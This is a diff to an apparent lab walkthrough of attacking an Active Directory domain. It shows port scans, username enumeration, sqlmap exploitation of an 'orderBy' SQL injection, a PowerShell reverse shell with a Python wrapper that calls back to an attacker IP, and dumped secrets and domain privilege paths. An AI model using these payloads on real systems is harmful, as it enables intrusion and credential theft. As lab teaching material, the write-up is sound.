@@ -284,7 +284,7 @@ sudo nmap -sC -sV -p$Ports -oN Full_TCP_Scan_245 192.168.58.0/24</p>
 389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: ninja.hack0., Site: Default-First-Site-Name)
 |_ssl-date: 2024-10-16T11:14:09+00:00; 0s from scanner time.
 | ssl-cert: Subject: commonName=dc-vil.ninja.hack
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc-vil.ninja.hack
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc-vil.ninja.hack
 | Not valid before: 2024-10-16T08:00:00
 |_Not valid after:  2025-10-16T08:00:00
 445/tcp   open     microsoft-ds?
@@ -292,7 +292,7 @@ sudo nmap -sC -sV -p$Ports -oN Full_TCP_Scan_245 192.168.58.0/24</p>
 593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ninja.hack0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: commonName=dc-vil.ninja.hack
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc-vil.ninja.hack
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc-vil.ninja.hack
 | Not valid before: 2024-10-16T08:00:00
 |_Not valid after:  2025-10-16T08:00:00
 |_ssl-date: 2024-10-16T11:14:09+00:00; 0s from scanner time.
@@ -300,12 +300,12 @@ sudo nmap -sC -sV -p$Ports -oN Full_TCP_Scan_245 192.168.58.0/24</p>
 3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: ninja.hack0., Site: Default-First-Site-Name)
 |_ssl-date: 2024-10-16T11:14:08+00:00; -1s from scanner time.
 | ssl-cert: Subject: commonName=dc-vil.ninja.hack
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc-vil.ninja.hack
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc-vil.ninja.hack
 | Not valid before: 2024-10-16T08:00:00
 |_Not valid after:  2025-10-16T08:00:00
 3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ninja.hack0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: commonName=dc-vil.ninja.hack
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc-vil.ninja.hack
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc-vil.ninja.hack
 | Not valid before: 2024-10-16T08:00:00
 |_Not valid after:  2025-10-16T08:00:00
 |_ssl-date: 2024-10-16T11:14:09+00:00; 0s from scanner time.
@@ -349,7 +349,7 @@ MAC Address: 00:0C:29:A9:AB:DB (VMware)
 Service Info: Host: DC-VIL; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-|_nbstat: NetBIOS name: DC-VIL, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:a9:ab:db (VMware)
+|_nbstat: NetBIOS name: DC-VIL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:a9:ab:db (VMware)
 | smb2-time: 
 |   date: 2024-10-16T11:13:26
 |_  start_date: N/A
@@ -419,7 +419,7 @@ Host script results:
 | smb2-time: 
 |   date: 2024-10-16T11:13:30
 |_  start_date: N/A
-|_nbstat: NetBIOS name: DC-AC, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:f6:76:29 (VMware)</code></pre>
+|_nbstat: NetBIOS name: DC-AC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:f6:76:29 (VMware)</code></pre>
 
 <p>192.168.58.21</p>
 
@@ -577,7 +577,7 @@ MAC Address: 00:0C:29:5E:96:FC (VMware)
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-|_nbstat: NetBIOS name: SQL, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:5e:96:fc (VMware)
+|_nbstat: NetBIOS name: SQL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:5e:96:fc (VMware)
 | smb2-security-mode: 
 |   3:1:1: 
 |_    Message signing enabled but not required
@@ -843,34 +843,34 @@ For this we can user Kerbrute: https://github.com/ropnop/kerbrute/releases/tag/v
 <pre><code>    __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
- / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
 /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
 
 Version: v1.0.3 (9dad6e1) - 10/16/24 - Ronnie Flathers @ropnop
 
-2024/10/16 21:04:35 >  Using KDC(s):
-2024/10/16 21:04:35 >  	dc-ac.academy.ninja.lan:88
+2024/10/16 21:04:35 &gt;  Using KDC(s):
+2024/10/16 21:04:35 &gt;  	dc-ac.academy.ninja.lan:88
 
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Noah@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Zane@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Samuel@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Ethan@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Willa@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Scott@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Victor@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Lee@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Taylor@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Sophia@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Taylor@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Charlie@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Isabella@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	David@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Katherine@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Yara@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	Uma@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	frank@academy.ninja.lan
-2024/10/16 21:04:35 >  [+] VALID USERNAME:	olivia@academy.ninja.lan
-2024/10/16 21:04:35 >  Done! Tested 30 usernames (19 valid) in 0.010 seconds</code></pre>
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Noah@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Zane@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Samuel@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Ethan@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Willa@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Scott@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Victor@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Lee@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Taylor@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Sophia@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Taylor@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Charlie@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Isabella@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	David@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Katherine@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Yara@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	Uma@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	frank@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  [+] VALID USERNAME:	olivia@academy.ninja.lan
+2024/10/16 21:04:35 &gt;  Done! Tested 30 usernames (19 valid) in 0.010 seconds</code></pre>
 
 <h2 id="sql-injection-on-parameter-orderby">SQL Injection on parameter ‘orderBy’</h2>
 
@@ -925,9 +925,9 @@ sqlmap -u 'http://web.academy.ninja.lan/Students?SearchString=charlie%2522&order
 <pre><code>--all #Retrieve everything
 --dump #Dump DBMS database table entries
 --dbs #Names of the available databases
---tables #Tables of a database ( -D <DB NAME> )
---columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
--D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column</code></pre>
+--tables #Tables of a database ( -D &lt;DB NAME&gt; )
+--columns #Columns of a table  ( -D &lt;DB NAME&gt; -T &lt;TABLE NAME&gt; )
+-D &lt;DB NAME&gt; -T &lt;TABLE NAME&gt; -C &lt;COLUMN NAME&gt; #Dump column</code></pre>
 
 <p>Enumerating some information inside MSSQL like hostname, current user and it's permission inside MSSQL.</p>
 <pre><code>sqlmap -u 'http://web.academy.ninja.lan/Students?SearchString=charlie%2522&orderBy=Firstname' --batch --hostname --current-user --is-dba --threads=10</code></pre>
@@ -977,7 +977,7 @@ JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHE
 
 <p>The same request will also issue the request on each database in this MSSQL server:</p>
 
-<pre><code>use <db>;
+<pre><code>use &lt;db&gt;;
 SELECT 'USER' as 'execute as', DB_NAME() AS 'database',
 pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor' 
 FROM sys.database_permissions pe 
@@ -1143,8 +1143,8 @@ To get a shell we can use a basic Powershell webshell.</p>
 $s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
 while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
     $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
-    $sb = (iex $d 2>&1 | Out-String );
-    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
+    $sb = (iex $d 2&gt;&1 | Out-String );
+    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps&gt; ');
     $s.Write($sb,0,$sb.Length);
     $s.Flush()
 };
@@ -1156,7 +1156,7 @@ $c.Close()</code></pre>
 import base64
 import sys
 
-if len(sys.argv) < 3:
+if len(sys.argv) &lt; 3:
   print('usage : %s ip port' % sys.argv[0])
   sys.exit(0)
 
@@ -1165,8 +1165,8 @@ $c = New-Object System.Net.Sockets.TCPClient('%s',%s);
 $s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
 while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
     $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
-    $sb = (iex $d 2>&1 | Out-String );
-    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
+    $sb = (iex $d 2&gt;&1 | Out-String );
+    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps&gt; ');
     $s.Write($sb,0,$sb.Length);
     $s.Flush()
 };
@@ -1241,7 +1241,7 @@ dpapi_userkey:0x6054d69d228906a2d89cfaf6f64e4868eb040272
  0000   64 08 D7 D8 E2 AF EA 8D  0F 5E 5B 10 1F 23 11 78   d........^[..#.x
  0010   ED CE AE 62 D3 21 B9 40  A8 90 6C 04 48 D8 43 40   ...b.!.@..l.H.C@
  0020   0B C9 38 BA 1C CA CF F0  B5 11 7C 8C E6 5D 2C 99   ..8.......|..],.
- 0030   46 0E 1B 18 B3 E1 DF F7  83 1C 3E CE CD 1E 60 9B   F.........>...`.
+ 0030   46 0E 1B 18 B3 E1 DF F7  83 1C 3E CE CD 1E 60 9B   F.........&gt;...`.
 NL$KM:6408d7d8e2afea8d0f5e5b101f231178edceae62d321b940a8906c0448d843400bc938ba1ccacff0b5117c8ce65d2c99460e1b18b3e1dff7831c3ececd1e609b
 [*] Cleaning up... </code></pre>
 
@@ -1275,7 +1275,7 @@ dpapi_userkey:0xdcc2bd3ad6bb78be3cdbe794498c30d5c2ad345e
  0000   64 08 D7 D8 E2 AF EA 8D  0F 5E 5B 10 1F 23 11 78   d........^[..#.x
  0010   ED CE AE 62 D3 21 B9 40  A8 90 6C 04 48 D8 43 40   ...b.!.@..l.H.C@
  0020   0B C9 38 BA 1C CA CF F0  B5 11 7C 8C E6 5D 2C 99   ..8.......|..],.
- 0030   46 0E 1B 18 B3 E1 DF F7  83 1C 3E CE CD 1E 60 9B   F.........>...`.
+ 0030   46 0E 1B 18 B3 E1 DF F7  83 1C 3E CE CD 1E 60 9B   F.........&gt;...`.
 NL$KM:6408d7d8e2afea8d0f5e5b101f231178edceae62d321b940a8906c0448d843400bc938ba1ccacff0b5117c8ce65d2c99460e1b18b3e1dff7831c3ececd1e609b
 [*] Cleaning up... 
 [*] Stopping service RemoteRegistry</code></pre>
@@ -1301,31 +1301,31 @@ GetADUsers.py -all 'academy.ninja.lan/SQL$@dc-ac.academy.ninja.lan' -aesKey '529
 Name                  Email                           PasswordLastSet      LastLogon           
 --------------------  ------------------------------  -------------------  -------------------
 Administrator                                         2024-10-16 08:51:28.398629  2024-10-16 09:16:50.079222 
-Guest                                                 <never>              <never>             
+Guest                                                 &lt;never&gt;              &lt;never&gt;             
 vagrant                                               2023-10-19 21:46:18.904099  2024-10-16 09:24:40.132210 
-krbtgt                                                2024-10-16 08:54:59.272038  <never>             
-                                                      2024-10-16 09:01:19.148443  <never>             
-alice                                                 2024-10-16 09:04:32.801631  <never>             
-david                                                 2024-10-16 09:04:35.004828  <never>             
-noah                                                  2024-10-16 09:04:37.020351  <never>             
-samuel                                                2024-10-16 09:04:39.020348  <never>             
-willa                                                 2024-10-16 09:04:41.051689  <never>             
-yara                                                  2024-10-16 09:04:43.082861  <never>             
-zane                                                  2024-10-16 09:04:45.129786  <never>             
-ethan                                                 2024-10-16 09:04:47.098475  <never>             
-scott                                                 2024-10-16 09:04:49.114113  <never>             
-katherine                                             2024-10-16 09:04:51.129724  <never>             
-victor                                                2024-10-16 09:04:52.832857  <never>             
-lee                                                   2024-10-16 09:04:54.534720  <never>             
-taylor                                                2024-10-16 09:04:56.175260  <never>             
-uma                                                   2024-10-16 09:04:57.800304  <never>             
-sophia                                                2024-10-16 09:04:59.456500  <never>             
-charlie                                               2024-10-16 09:05:01.269883  <never>             
-isabella                                              2024-10-16 09:05:03.082381  <never>             
+krbtgt                                                2024-10-16 08:54:59.272038  &lt;never&gt;             
+                                                      2024-10-16 09:01:19.148443  &lt;never&gt;             
+alice                                                 2024-10-16 09:04:32.801631  &lt;never&gt;             
+david                                                 2024-10-16 09:04:35.004828  &lt;never&gt;             
+noah                                                  2024-10-16 09:04:37.020351  &lt;never&gt;             
+samuel                                                2024-10-16 09:04:39.020348  &lt;never&gt;             
+willa                                                 2024-10-16 09:04:41.051689  &lt;never&gt;             
+yara                                                  2024-10-16 09:04:43.082861  &lt;never&gt;             
+zane                                                  2024-10-16 09:04:45.129786  &lt;never&gt;             
+ethan                                                 2024-10-16 09:04:47.098475  &lt;never&gt;             
+scott                                                 2024-10-16 09:04:49.114113  &lt;never&gt;             
+katherine                                             2024-10-16 09:04:51.129724  &lt;never&gt;             
+victor                                                2024-10-16 09:04:52.832857  &lt;never&gt;             
+lee                                                   2024-10-16 09:04:54.534720  &lt;never&gt;             
+taylor                                                2024-10-16 09:04:56.175260  &lt;never&gt;             
+uma                                                   2024-10-16 09:04:57.800304  &lt;never&gt;             
+sophia                                                2024-10-16 09:04:59.456500  &lt;never&gt;             
+charlie                                               2024-10-16 09:05:01.269883  &lt;never&gt;             
+isabella                                              2024-10-16 09:05:03.082381  &lt;never&gt;             
 frank                                                 2024-10-16 09:05:04.848006  2024-10-19 23:04:35.319767 
-olivia                                                2024-10-16 09:05:06.676133  <never>             
-backup                                                2024-10-16 09:05:08.332387  <never>             
-sql_svc                                               2024-10-16 09:05:09.926135  <never> </code></pre>
+olivia                                                2024-10-16 09:05:06.676133  &lt;never&gt;             
+backup                                                2024-10-16 09:05:08.332387  &lt;never&gt;             
+sql_svc                                               2024-10-16 09:05:09.926135  &lt;never&gt; </code></pre>
 
 <p>We have more users that we did from our initial enumeration.</p>
 
@@ -1395,12 +1395,12 @@ Before we use Bloodhound-Quickwins you need to do the following steps.</p>
 [+] Domain admins (group) 	: DOMAIN ADMINS@ACADEMY.NINJA.LAN
 [+] Domain admins (group) 	: ENTERPRISE ADMINS@ACADEMY.NINJA.LAN
 [+] Domain admins (group) 	: SENSEI@ACADEMY.NINJA.LAN
-[+] Domain admins (enabled) 	: ADMINISTRATOR@ACADEMY.NINJA.LAN [LASTLOG: < 1 year]
+[+] Domain admins (enabled) 	: ADMINISTRATOR@ACADEMY.NINJA.LAN [LASTLOG: &lt; 1 year]
 [+] Domain admins (enabled) 	: ALICE@ACADEMY.NINJA.LAN [LASTLOG:  NEVER]
 [+] Domain admins (enabled) 	: DAVID@ACADEMY.NINJA.LAN [LASTLOG:  NEVER]
 [+] Domain admins (enabled) 	: KATHERINE@ACADEMY.NINJA.LAN [LASTLOG:  NEVER]
 [+] Domain admins (enabled) 	: UMA@ACADEMY.NINJA.LAN [LASTLOG:  NEVER]
-[+] Domain admins (enabled) 	: VAGRANT@ACADEMY.NINJA.LAN [LASTLOG: < 1 year]
+[+] Domain admins (enabled) 	: VAGRANT@ACADEMY.NINJA.LAN [LASTLOG: &lt; 1 year]
 [+] Domain admins (enabled) 	: YARA@ACADEMY.NINJA.LAN [LASTLOG:  NEVER]
 
 ###########################################################
@@ -1424,67 +1424,67 @@ Before we use Bloodhound-Quickwins you need to do the following steps.</p>
 ###########################################################
 [*] Can configure Resource-Based Constrained Delegation
 ###########################################################
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ACCOUNT OPERATORS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ADMINISTRATOR@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ADMINISTRATORS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ADMINSDHOLDER@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ALICE@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> BACKUP OPERATORS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> DAVID@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> DOMAIN ADMINS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ENTERPRISE ADMINS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> ENTERPRISE KEY ADMINS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> KATHERINE@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> KEY ADMINS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> KRBTGT@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> PRINT OPERATORS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> READ-ONLY DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> REPLICATOR@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> SCHEMA ADMINS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> SENSEI@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> SERVER OPERATORS@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> UMA@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> VAGRANT@ACADEMY.NINJA.LAN
-[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --> WriteOwner --> YARA@ACADEMY.NINJA.LAN
-[+] RBCD : configure from SQL.ACADEMY.NINJA.LAN [OWNED] --> GenericAll --> COMPUTERS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ACCOUNT OPERATORS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ADMINISTRATOR@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ADMINISTRATORS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ADMINSDHOLDER@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ALICE@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; BACKUP OPERATORS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; DAVID@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; DOMAIN ADMINS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ENTERPRISE ADMINS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; ENTERPRISE KEY ADMINS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; KATHERINE@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; KEY ADMINS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; KRBTGT@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; PRINT OPERATORS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; READ-ONLY DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; REPLICATOR@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; SCHEMA ADMINS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; SENSEI@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; SERVER OPERATORS@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; UMA@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; VAGRANT@ACADEMY.NINJA.LAN
+[+] RBCD : configure from BACKUP@ACADEMY.NINJA.LAN --&gt; WriteOwner --&gt; YARA@ACADEMY.NINJA.LAN
+[+] RBCD : configure from SQL.ACADEMY.NINJA.LAN [OWNED] --&gt; GenericAll --&gt; COMPUTERS@ACADEMY.NINJA.LAN
 
 ###########################################################
 [*] relationships - testing which group can do what to others (all)
 ##########################################################
-[+] ACL : RAS AND IAS SERVERS@ACADEMY.NINJA.LAN--> WriteDacl --> RAS AND IAS SERVERS ACCESS CHECK@ACADEMY.NINJA.LAN
-[+] ACL : RAS AND IAS SERVERS@ACADEMY.NINJA.LAN--> WriteOwner --> RAS AND IAS SERVERS ACCESS CHECK@ACADEMY.NINJA.LAN
-[+] ACL : SENSEI@ACADEMY.NINJA.LAN--> AdminTo --> DC-AC.ACADEMY.NINJA.LAN
-[+] ACL : SENSEI@ACADEMY.NINJA.LAN--> DCSync --> ACADEMY.NINJA.LAN
+[+] ACL : RAS AND IAS SERVERS@ACADEMY.NINJA.LAN--&gt; WriteDacl --&gt; RAS AND IAS SERVERS ACCESS CHECK@ACADEMY.NINJA.LAN
+[+] ACL : RAS AND IAS SERVERS@ACADEMY.NINJA.LAN--&gt; WriteOwner --&gt; RAS AND IAS SERVERS ACCESS CHECK@ACADEMY.NINJA.LAN
+[+] ACL : SENSEI@ACADEMY.NINJA.LAN--&gt; AdminTo --&gt; DC-AC.ACADEMY.NINJA.LAN
+[+] ACL : SENSEI@ACADEMY.NINJA.LAN--&gt; DCSync --&gt; ACADEMY.NINJA.LAN
 
 ###########################################################
 [*] relationships - testing which (non admins) users can do what to others (all)
 ###########################################################
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> UMA@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> KATHERINE@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> YARA@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> DAVID@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> ALICE@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> VAGRANT@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> KRBTGT@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> ADMINISTRATOR@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> ADMINISTRATORS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> DOMAIN ADMINS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> ENTERPRISE ADMINS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> ACCOUNT OPERATORS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> KEY ADMINS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> ENTERPRISE KEY ADMINS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> SENSEI@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> READ-ONLY DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> SERVER OPERATORS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> SCHEMA ADMINS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> DOMAIN CONTROLLERS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> REPLICATOR@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> PRINT OPERATORS@ACADEMY.NINJA.LAN [AdminCount]
-[+] ACL : BACKUP@ACADEMY.NINJA.LAN--> WriteOwner --> BACKUP OPERATORS@ACADEMY.NINJA.LAN [AdminCount]
